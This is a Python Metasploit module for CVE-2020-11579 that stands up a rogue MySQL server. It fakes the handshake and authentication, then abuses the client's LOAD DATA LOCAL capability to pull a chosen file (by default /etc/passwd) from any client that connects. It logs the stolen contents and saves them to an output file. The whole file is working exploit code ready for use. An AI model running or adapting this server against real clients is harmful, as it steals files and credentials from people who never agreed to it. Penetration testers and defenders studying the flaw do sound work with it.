#!/usr/bin/env python3

# mysql rogue server requirements
import socket
import asyncore
import asynchat
import struct
import logging
import logging.handlers
import codecs
from argparse import ArgumentParser
from enum import Enum
import metasploit.module as module

metadata = {
    'name': 'mysqlrogue',
    'description': '''
        The script starts a MySQL server that requests and retrieves files from clients that connect to it.
    ''',
    'authors': [
        'Moritz Nentwig'
    ],
    'date': '2021-09-03',
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'https://github.com/ShielderSec/CVE-2020-11579'},
        {'type': 'cve', 'ref': '2020-11579'}
    ],
    'type': 'capture_server',
    'options': {
        'output_file': {'type': 'string', 'description': 'Output file to save information to', 'required': False, 'default': '/tmp/mysql_rogue_output.txt'},
        'lhost': {'type': 'string', 'description': 'Host to listen', 'required': True, 'default': '127.0.0.1'},
        'lport': {'type': 'int', 'description': 'Port to listen', 'required': True, 'default': '3306'},
        'file': {'type': 'string', 'description': 'File trying to retrieve', 'required': True, 'default': '/etc/passwd'}
    }
}

class LastPacketOfState(Exception):
    pass

class PacketIterator:
    def __init__(self, mysql_pkt):
        self.packet = mysql_pkt.header + mysql_pkt.payload
        self.index = 0

    def __next__(self):
        if self.index >= len(self.packet):
            raise StopIteration
        retval = self.packet[self.index]
        self.index += 1
        return retval

# mysql packet 
class mysql_packet(object):
    packet_header = struct.Struct('<Hbb')
    packet_header_long = struct.Struct('<Hbbb')
    def __init__(self, packet_type, payload):
        self.header = b''
        if isinstance(packet_type, mysql_packet):
            self.packet_num = packet_type.packet_num + 1
        else:
            self.packet_num = packet_type
        self.payload = payload

    def __str__(self):
        return bytes(self).encode('utf-8', 'ignore')

    def __repr__(self):
        return repr(str(self))

    def __iter__(self):
        return PacketIterator(self)

    @staticmethod
    def parse(raw_data):
        packet_num = raw_data[0]
        payload = raw_data[1:]

        return mysql_packet(packet_num, payload)

    def bytes(self):
        payload_len = len(self.payload)
        if payload_len < 65536:
            self.header = mysql_packet.packet_header.pack(payload_len,
            0, self.packet_num)
        else:
            self.header = mysql_packet.packet_header.pack(payload_len & 0xFFFF,
            payload_len >> 16, 0, self.packet_num)
        return self.header + self.payload

def can_client_use_load_data_local(mysql_packet):
    # \x05\xa6... -> \xa6\x05
    client_caps = mysql_packet[:2][::-1]
    client_caps = int(codecs.encode(client_caps, 'hex'), 16)
    # reference: https://dev.mysql.com/doc/internals/en/capability-flags.html
    return ((client_caps & 0x80) == 0x80)

def is_character_printable(c):
  # check if char is printable
  return (c < 127 and c >= 32)

def hexdump(packet):
    ascii_string = ""
    memory_address = 0
    hexdump_string = ""
    for byte in packet:
        ascii_string = ascii_string + \
            (chr(byte) if is_character_printable(byte) else '.')
        if memory_address%16 == 0:
            # add address
            hexdump_string += format(memory_address, '04X') + " "
            hexdump_string += codecs.encode(bytes([byte]), 'hex').decode() + " "
        elif memory_address%16 == 15:
            hexdump_string += codecs.encode(bytes([byte]), 'hex').decode() + " "
            # add ascii chars
            hexdump_string += ascii_string + "\n"
            ascii_string = ""
        else:
            hexdump_string += codecs.encode(bytes([byte]), 'hex').decode() + " "
        memory_address = memory_address + 1

    # check if last line is not full
    if len(ascii_string) > 0:
        # append spaces to be aligned
        hexdump_string += ' ' * (70 - (len(hexdump_string) % 70) - 17)
        # append remaining ascii chars
        hexdump_string += ascii_string
    return hexdump_string.rstrip("\n")

class tcp_request_handler(asynchat.async_chat):
    def __init__(self, addr):
        asynchat.async_chat.__init__(self, sock=addr[0])
        self.addr = addr[1]
        self.ibuffer = []
        # the first 3 bytes contain the mysql packet's len
        self.set_terminator(3)
        self.state = 'LEN'
        self.sub_state = 'Auth'
        self.extracted_file = b''
        self.push(
            mysql_packet(
                0,
                    # reference: https://dev.mysql.com/doc/internals/en/connection-phase-packets.html
                    b'\x0a' +                                                         # protocol
                    '5.1.66-0+squeeze1'.encode() + b'\0' +                            # server version
                    b'\x36\x00\x00\x00' +                                             # thread ID
                    'zBz`QV;d'.encode() + b'\0' +                                     # salt
                    b'\xdf\xf7' +                                                     #server capabilities
                    b'\x08' +                                                         # server language: latin1 collate latin1_swedish_ci
                    b'\x02\x00' +                                                     # server status                  
                    b'\x00\x00' +                                                     # extended server capabilities
                    chr(len("mysql_native_password")).encode() +                                # auth plugin's 
                    b'\x00' * 10 +                                                    # unused
                    'dL/DGwC*CVcr'.encode() + b'\0' +                                 # salt
                    "mysql_native_password".encode()                                  # auth plugin
            ).bytes(), "Server Greeting"
        )

    def push(self, data, label="?"):
        logging.debug('client (%s:%s) <- server: (%s)\n%s', self.addr[0], self.addr[1], label, hexdump(data))
        asynchat.async_chat.push(self, data)

    def send_response_ok(self, packet):
        self.push(mysql_packet(
                packet, b'\0\0\0\x02\0\0\0'
            ).bytes(), "Response OK")

    def collect_incoming_data(self, data):
        if len(data) == 3:
            logging.debug('client (%s:%s) -> server: (len)\n%s', self.addr[0], self.addr[1], hexdump(data))
        else:
            logging.debug('client (%s:%s) -> server: (data)\n%s', self.addr[0], self.addr[1], hexdump(data))
        self.ibuffer += data

    def found_terminator(self):
        data = self.ibuffer
        self.ibuffer = b''
        # we read the length first
        if self.state == 'LEN':
            len_bytes = data[0] + 256*data[1] + 65536*data[2] + 1
            if len_bytes < 65536:
                self.set_terminator(len_bytes)
                self.state = 'Data'
            else:
                self.state = 'MoreLength'

        # special case if packet len >= 65536 bytes
        elif self.state == 'MoreLength':
            if data[0] != 0:
                self.push(b'\x00', "closing socket")
                self.close_when_done()
            else:
                self.state = 'Data'

        # actual mysql packet payload
        elif self.state == 'Data':
            packet = mysql_packet.parse(data)
            try:
                if packet.packet_num == 0:
                    if packet.payload[0] == 3:
                        logging.debug('received Request Query (this is going to be ignored) ^')

                        PACKET = mysql_packet(
                            packet,
                            b'\xFB' + FILE.encode()
                        )
                        self.set_terminator(3)
                        self.state = 'LEN'
                        self.sub_state = 'File'
                        self.push(PACKET.bytes(),"file request / response TABULAR")
                    elif packet.payload[0] == 1:
                        logging.debug("received request command quit ^")
                        self.push(b'\x00', 'quitting the connection')
                        self.close_when_done()
                    else:
                        pass
                else:
                    if self.sub_state == 'File':
                        if len(data) == 1:
                            self.send_response_ok(packet)
                            logging.debug("file exfiltration finished")

                            if len(self.extracted_file):
                                logging.info("Successfully extracted file from {}:{}:\n\n{}".format(
                                self.addr[0], self.addr[1], ''.join(self.extracted_file.decode())))
                                if OUTPUT_FILE is not None:
                                    try:
                                        with open(OUTPUT_FILE, 'ab') as f:
                                            dataFrom = '---- Extracted file from {}:{}\n'.format(self.addr[0], self.addr[1])
                                            f.write(dataFrom.encode())
                                            f.write(self.extracted_file)
                                            f.write(b'\n')
                                        logging.info("extracted file saved to %s\n", OUTPUT_FILE)
                                    except Exception as e:
                                        logging.error("Error while trying to save exfiltrated file: %s", e)
                            else:
                                logging.error("file extraction failed")

                            self.extracted_file = b''
                            raise LastPacketOfState()
                        else:
                            logging.debug('received file contents ^')
                            # append to exfiltrated file
                            self.extracted_file += data[1:]

                            self.set_terminator(3)
                            self.state = 'LEN'
                    elif self.sub_state == 'Auth':
                        logging.debug('received login info and client capabilities ^')
                        if can_client_use_load_data_local(packet.payload) is False:
                            logging.error("Target client has LOAD DATA LOCAL bit NOT set -- exploit will probably fail...")
                        else:
                            log.info('client has LOAD DATA LOCAL bit set (good)')
                        self.send_response_ok(packet)
                        logging.debug("fake authentication finished")
                        raise LastPacketOfState()
                    else:
                        logging.error("??? couldn't recognize state ???")
                        raise ValueError('Unknown packet')
            except LastPacketOfState:
                # once we finish every state (e.g.: authentication, file exfiltration, ...)
                # we reset the packet reader to continue with the next one
                self.state = 'LEN'
                self.sub_state = None
                self.set_terminator(3)
        else:
            logging.error('Unknown state')
            self.push(b'\x00')
            self.close_when_done()
    
class mysql_listener(asyncore.dispatcher):
    global args
    def __init__(self, sock=None):
        asyncore.dispatcher.__init__(self, sock)

        if not sock:
            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
            self.set_reuse_addr()
            try:
                self.bind((LHOST, LPORT))
            except socket.error as e:
                logging.error("Error while binding to local port: {}".format(e))
                exit()

            self.listen(10)

    def handle_accept(self):
        logging.debug("Accepting new logged packet")
        pair = self.accept()
        self.ip = pair[1][0]
        self.port = pair[1][1]

        if pair is not None:
            logging.info("new connection from {}:{}".format(self.ip, self.port))
            tmp = tcp_request_handler(pair) 

class exploit_listener(object):
    def __init__(self):
        self.mysql = mysql_listener()

    def start(self):
        asyncore.loop()

    def stop(self):
        self.mysql.close()

def run(args):

    module.LogHandler.setup()

    global FILE
    global LPORT
    global LHOST
    global OUTPUT_FILE

    FILE = args["file"]
    LPORT = int(args["lport"])
    LHOST = args["lhost"]
    OUTPUT_FILE = args["output_file"]

    logging.info("Evil mysql server is now listening \ on {}:{} -- Kill the job once done".format(LHOST, LPORT))

    rogue_server = exploit_listener()
    rogue_server.start()
    
if __name__=='__main__':
    module.run(metadata, run)